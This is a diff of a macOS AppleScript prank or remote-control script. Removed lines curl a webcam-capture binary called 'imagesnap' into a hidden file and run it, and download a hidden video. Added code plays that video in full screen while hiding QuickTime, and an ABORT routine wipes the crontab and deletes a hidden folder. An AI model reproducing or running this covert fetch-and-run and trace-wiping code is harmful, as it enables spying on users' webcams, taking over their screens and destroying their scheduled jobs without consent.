@@ -1,11 +1,32 @@
---set volume 4
---say "hello"
---tell application "Finder" to say "hi"
---tell application "Finder" to activate
---tell application "Finder" to display dialog "hi"
---do shell script "curl http://sitetest.github.io/imagesnap >~/.i; chmod +x ~/.i; ~/.i"
-do shell script "curl http://sitetest.github.io/tetris.mp4 >~/.tetris.mp4"
---open ~/.tetris
---delay 4
---tell application "System Events" to do keystroke "f" using {control down, command down}
+--ABORT()
 
+on tetris()
+	set p to "/Users/" & (do shell script "whoami") & "/.tetris.mp4"
+	
+	if exist(p) then
+		tell application "QuickTime Player" to open p
+		tell application "System Events"
+			repeat 5 times
+				set visible of process "QuickTime Player" to false
+				delay 1
+			end repeat
+		end tell
+		
+		tell application "QuickTime Player" to activate
+		delay 1
+		tell application "System Events" to keystroke "f" using {control down, command down}
+		delay 2
+		tell application "System Events" to keystroke " "
+	end if
+end tetris
+
+on exist(f)
+	tell application "System Events"
+		return exists file f
+	end tell
+end exist
+
+on ABORT()
+	do shell script "crontab -r"
+	do shell script "rm -rf ~/.tmp;"
+end ABORT
